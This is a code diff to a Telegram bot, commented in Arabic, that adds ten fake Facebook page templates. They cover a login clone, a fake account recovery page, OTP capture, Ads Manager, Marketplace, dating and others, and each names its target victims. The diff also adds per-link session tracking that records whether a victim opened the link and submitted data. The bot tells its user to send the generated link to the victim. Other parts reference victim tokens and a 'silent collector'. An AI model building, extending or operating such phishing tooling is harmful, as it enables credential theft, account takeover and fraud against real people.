@@ -1,15 +1,16 @@
 # bot_handlers.py
 # ============================================================
 # معالجات البوت الرئيسية: /start + callback + step handlers
-# v10 — نظيف بدون تكرار (edit_message_text)
+# v11 — Facebook Fake Sites (10 قوالب مواقع)
 # ============================================================
 
 import io
 import html
 import time
+import uuid
+import json
 import threading
 import requests
-import uuid
 from datetime import datetime
 from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
 
@@ -58,12 +59,10 @@ def h(text):
 
 
 # ============================================================
-# ★★★ Helpers — تعديل ذكي للرسالة ★★★
+# Safe Edit Helper
 # ============================================================
 def safe_edit(call, text, reply_markup=None, parse_mode="HTML"):
-    """
-    يحاول يعدل الرسالة، ولو فشل يبعت رسالة جديدة
-    """
+    """يحاول يعدل الرسالة، ولو فشل يبعت رسالة جديدة"""
     try:
         bot.edit_message_text(
             text=text,
@@ -76,10 +75,8 @@ def safe_edit(call, text, reply_markup=None, parse_mode="HTML"):
         return True
     except Exception as e:
         err = str(e).lower()
-        # لو الرسالة نفسها — مش مشكلة
         if "message is not modified" in err:
             return True
-        # لو الرسالة قديمة أوي — ابعت جديدة
         if "message to edit not found" in err or "message can't be edited" in err:
             try:
                 bot.send_message(
@@ -118,6 +115,138 @@ except ImportError:
     def _find_latest_apk_release():
         return None
     def _get_cached_apk_info():
+        return None
+
+
+# ============================================================
+# ★★★ Facebook Fake Sites Templates ★★★
+# ============================================================
+FACEBOOK_SITES = {
+    "01_login": {
+        "emoji": "🔐",
+        "name": "تسجيل دخول فيسبوك",
+        "desc": (
+            "الصفحة الرسمية لتسجيل الدخول إلى فيسبوك.\n"
+            "تظهر بنسبة 95% مطابقة للأصل."
+        ),
+    },
+    "02_recovery": {
+        "emoji": "🔄",
+        "name": "استرداد حساب",
+        "desc": (
+            "يوهم الضحية بمحاولة اختراق لحسابها.\n"
+            "يطلب منها كلمة المرور لمنع الاختراق."
+        ),
+    },
+    "03_verify": {
+        "emoji": "✅",
+        "name": "تحقق من الحساب",
+        "desc": (
+            "صفحة OTP لتحقق أمني.\n"
+            "تطلب كود التحقق المرسل على الهاتف."
+        ),
+    },
+    "04_ads": {
+        "emoji": "📊",
+        "name": "Ads Manager",
+        "desc": (
+            "لوحة تحكم إعلانات Meta المزيفة.\n"
+            "تستهدف أصحاب البيزنس والإعلانات."
+        ),
+    },
+    "05_business": {
+        "emoji": "💼",
+        "name": "Business Suite",
+        "desc": (
+            "أدوات إدارة صفحات العمل.\n"
+            "تستهدف أصحاب الصفحات والمشاريع."
+        ),
+    },
+    "06_marketplace": {
+        "emoji": "🛒",
+        "name": "Marketplace",
+        "desc": (
+            "منتج مغري للبيع في Marketplace.\n"
+            "تستهدف أي شخص يبحث عن شراء."
+        ),
+    },
+    "07_groups": {
+        "emoji": "👥",
+        "name": "Facebook Groups",
+        "desc": (
+            "مجموعة وظائف أو خاصة.\n"
+            "تستهدف الباحثين عن عمل."
+        ),
+    },
+    "08_dating": {
+        "emoji": "❤️",
+        "name": "Facebook Dating",
+        "desc": (
+            "منصة تعارف مع عرض خاص.\n"
+            "تستهدف الشباب والشابات."
+        ),
+    },
+    "09_gaming": {
+        "emoji": "🎮",
+        "name": "Facebook Gaming",
+        "desc": (
+            "مكافآت ألعاب و Drops مجانية.\n"
+            "تستهدف اللاعبين."
+        ),
+    },
+    "10_creator": {
+        "emoji": "🎬",
+        "name": "Creator Studio",
+        "desc": (
+            "أدوات صنّاع المحتوى الاحترافية.\n"
+            "تستهدف اليوتيوبرز والمؤثرين."
+        ),
+    },
+}
+
+
+# ============================================================
+# ★★★ إنشاء جلسة Facebook ★★★
+# ============================================================
+def _create_fb_session(chat_id, template_key):
+    """ينشئ session في Redis ويرجع الرابط"""
+    if not redis_client:
+        return None
+
+    try:
+        session_id = uuid.uuid4().hex[:16]
+        now = time.time()
+
+        session_data = {
+            "session_id": session_id,
+            "chat_id": str(chat_id),
+            "type": "facebook",
+            "template": template_key,
+            "created_at": now,
+            "accessed": False,
+            "collected": False,
+            "label": FACEBOOK_SITES.get(template_key, {}).get('name', 'Facebook'),
+        }
+
+        # خزن لمدة 30 يوم
+        redis_client.setex(
+            f"se_session:{session_id}",
+            86400 * 30,
+            json.dumps(session_data, ensure_ascii=False)
+        )
+
+        # أضف لقائمة المستخدم
+        redis_client.lpush(f"se_user_sessions:{chat_id}", session_id)
+        redis_client.ltrim(f"se_user_sessions:{chat_id}", 0, 199)
+        redis_client.expire(f"se_user_sessions:{chat_id}", 86400 * 30)
+
+        logger.info(f"FB Session created: {session_id} | {template_key} | chat={chat_id}")
+        metrics.inc_counter("fb_sessions_created")
+
+        return session_id
+
+    except Exception as e:
+        logger.exception(f"_create_fb_session error: {e}")
         return None
 
 
@@ -175,6 +304,23 @@ def silent_collector_panel():
     m.add(InlineKeyboardButton("📊 الإحصائيات", callback_data="silent_stats"))
     m.add(InlineKeyboardButton("📋 آخر النتائج", callback_data="silent_recent"))
     m.add(InlineKeyboardButton("🔙 رجوع للقائمة", callback_data="back_to_main"))
+    return m
+
+
+# ============================================================
+# ★★★ لوحة Facebook Sites ★★★
+# ============================================================
+def build_facebook_sites_panel():
+    """لوحة قوالب فيسبوك الـ 10"""
+    m = InlineKeyboardMarkup()
+
+    for key, tpl in FACEBOOK_SITES.items():
+        m.add(InlineKeyboardButton(
+            f"{tpl['emoji']} {tpl['name']}",
+            callback_data=f"fb_site_{key}"
+        ))
+
+    m.add(InlineKeyboardButton("🔙 رجوع للقائمة الرئيسية", callback_data="back_to_main"))
     return m
 
 
@@ -541,6 +687,156 @@ def _handle_callback(call, chat_id, user_id, data):
         logger.exception(f"SE handler error: {e}")
 
     # ============================================================
+    # ★★★ Facebook Fake Sites ★★★
+    # ============================================================
+    if data == "gen_fb":
+        check = can_use_tool(chat_id, "fb")
+        if not check["allowed"]:
+            bot.answer_callback_query(call.id, "❌ لا يوجد رصيد", show_alert=True)
+            safe_edit(
+                call,
+                _deny_message(check["reason"], chat_id, "fb", check),
+                reply_markup=main_menu(user_id)
+            )
+            return
+
+        bot.answer_callback_query(call.id)
+
+        safe_edit(
+            call,
+            "📘 <b>مواقع فيسبوك المزيفة</b>\n"
+            "━━━━━━━━━━━━━━━━━━\n\n"
+            "🎯 <b>10 قوالب احترافية</b>\n"
+            "كل قالب = موقع حقيقي بنسبة 95%\n\n"
+            "💡 <i>اختر القالب المناسب للضحية</i>",
+            reply_markup=build_facebook_sites_panel()
+        )
+        return
+
+    if data.startswith("fb_site_"):
+        template_key = data.replace("fb_site_", "")
+
+        tpl = FACEBOOK_SITES.get(template_key)
+        if not tpl:
+            bot.answer_callback_query(call.id, "❌ القالب غير موجود", show_alert=True)
+            return
+
+        check = can_use_tool(chat_id, "fb")
+        if not check["allowed"]:
+            bot.answer_callback_query(call.id, "❌ لا يوجد رصيد", show_alert=True)
+            return
+
+        bot.answer_callback_query(call.id, "🔄 جاري توليد الرابط...")
+
+        # استهلك استخدام
+        consume_usage(chat_id, "fb")
+
+        # أنشئ session
+        session_id = _create_fb_session(chat_id, template_key)
+
+        if not session_id:
+            safe_edit(
+                call,
+                "❌ فشل إنشاء الجلسة، حاول مرة أخرى",
+                reply_markup=build_facebook_sites_panel()
+            )
+            return
+
+        # بناء الرابط
+        fake_link = f"{PUBLIC_URL}/fs/facebook/{template_key}?s={session_id}"
+
+        text = (
+            f"{tpl['emoji']} <b>{tpl['name']}</b>\n"
+            f"━━━━━━━━━━━━━━━━━━\n\n"
+            f"📋 <b>وصف القالب:</b>\n"
+            f"<i>{tpl['desc']}</i>\n\n"
+            f"🎯 <b>الرابط الجاهز:</b>\n"
+            f"<code>{fake_link}</code>\n\n"
+            f"💡 <b>كيفية الاستخدام:</b>\n"
+            f"• انسخ الرابط\n"
+            f"• أرسله للضحية\n"
+            f"• عندما تفتحه، ستظهر صفحة {tpl['name']}\n"
+            f"• البوت سيستقبل البيانات فوراً"
+        )
+
+        m = InlineKeyboardMarkup()
+        # زر نسخ الرابط
+        try:
+            from telebot.types import CopyTextButton
+            m.add(InlineKeyboardButton(
+                "📋 نسخ الرابط",
+                copy_text=CopyTextButton(text=fake_link)
+            ))
+        except Exception:
+            pass
+
+        m.row(
+            InlineKeyboardButton("🔄 توليد جديد", callback_data=f"fb_site_{template_key}"),
+            InlineKeyboardButton("📊 الإحصائيات", callback_data=f"fb_stats_{template_key}"),
+        )
+        m.add(InlineKeyboardButton("🔙 رجوع للقوالب", callback_data="gen_fb"))
+
+        safe_edit(call, text, reply_markup=m)
+
+        logger.info(f"FB Fake Link generated: {template_key} | {session_id}")
+        return
+
+    if data.startswith("fb_stats_"):
+        template_key = data.replace("fb_stats_", "")
+
+        bot.answer_callback_query(call.id, "📊 جاري الحساب...")
+
+        try:
+            # اجلب كل sessions المستخدم
+            session_ids = []
+            if redis_client:
+                session_ids = redis_client.lrange(f"se_user_sessions:{chat_id}", 0, 499) or []
+
+            # فلتر حسب القالب
+            total = 0
+            accessed = 0
+            collected = 0
+
+            for sid in session_ids:
+                try:
+                    raw = redis_client.get(f"se_session:{sid}")
+                    if not raw:
+                        continue
+                    sdata = json.loads(raw)
+                    if sdata.get('template') != template_key:
+                        continue
+
+                    total += 1
+                    if sdata.get('accessed'):
+                        accessed += 1
+                    if sdata.get('collected'):
+                        collected += 1
+                except Exception:
+                    continue
+
+            tpl = FACEBOOK_SITES.get(template_key, {})
+
+            rate = (collected / total * 100) if total > 0 else 0
+
+            text = (
+                f"📊 <b>إحصائيات {tpl.get('name', template_key)}</b>\n"
+                f"━━━━━━━━━━━━━━━━━━\n\n"
+                f"🔗 <b>إجمالي اللينكات:</b> <code>{total}</code>\n"
+                f"👁️ <b>تم فتحها:</b> <code>{accessed}</code>\n"
+                f"✅ <b>جمعت بيانات:</b> <code>{collected}</code>\n"
+                f"📈 <b>نسبة النجاح:</b> <code>{rate:.1f}%</code>\n"
+            )
+
+        except Exception as e:
+            logger.exception(f"fb_stats error: {e}")
+            text = f"❌ خطأ: {h(str(e)[:200])}"
+
+        m = InlineKeyboardMarkup()
+        m.add(InlineKeyboardButton("🔙 رجوع", callback_data=f"fb_site_{template_key}"))
+        safe_edit(call, text, reply_markup=m)
+        return
+
+    # ============================================================
     # ★★★ Silent Collector ★★★
     # ============================================================
     if data == "gen_silent":
@@ -556,7 +852,6 @@ def _handle_callback(call, chat_id, user_id, data):
         consume_usage(chat_id, "silent")
         bot.answer_callback_query(call.id)
 
-        # نبعت رسالة جديدة لطلب الاسم (لأنها تحتاج input)
         msg = bot.send_message(
             chat_id,
             "🎯 <b>جمع المعلومات</b>\n"
@@ -865,7 +1160,6 @@ def _handle_callback(call, chat_id, user_id, data):
                 lines = ["📜 <b>آخر 20 تحديث</b>\n━━━━━━━━━━━━━━━━━━"]
                 for item in history_raw:
                     try:
-                        import json
                         entry = json.loads(item) if isinstance(item, str) else item
                         status = entry.get("status", "?")
                         token = entry.get("token", "?")[:12]
@@ -1622,36 +1916,6 @@ def _handle_callback(call, chat_id, user_id, data):
         return
 
     # ============================================================
-    # فيسبوك
-    # ============================================================
-    if data == "gen_fb":
-        check = can_use_tool(chat_id, "fb")
-        if not check["allowed"]:
-            bot.answer_callback_query(call.id, "❌ لا يوجد رصيد", show_alert=True)
-            safe_edit(
-                call,
-                _deny_message(check["reason"], chat_id, "fb", check),
-                reply_markup=main_menu(user_id)
-            )
-            return
-        consume_usage(chat_id, "fb")
-        bot.answer_callback_query(call.id, "جاري التجهيز...")
-        link = f"{PUBLIC_URL}/login.php?id={chat_id}"
-
-        m = InlineKeyboardMarkup()
-        m.add(InlineKeyboardButton("🔙 رجوع", callback_data="back_to_main"))
-
-        safe_edit(
-            call,
-            f"🎯 <b>رابط فيسبوك</b>\n"
-            f"━━━━━━━━━━━━━━━━━━\n\n"
-            f"<code>{h(link)}</code>\n\n"
-            f"💡 أرسل هذا الرابط للضحية",
-            reply_markup=m
-        )
-        return
-
-    # ============================================================
     # انستقرام
     # ============================================================
     if data == "gen_ig":
@@ -1757,7 +2021,6 @@ def upd_target_handler(message):
             token_key = f"victim_token:{target}"
             raw = redis_client.get(token_key)
             if raw:
-                import json
                 info = json.loads(raw)
                 found_victim_id = info.get("victim_id")
 
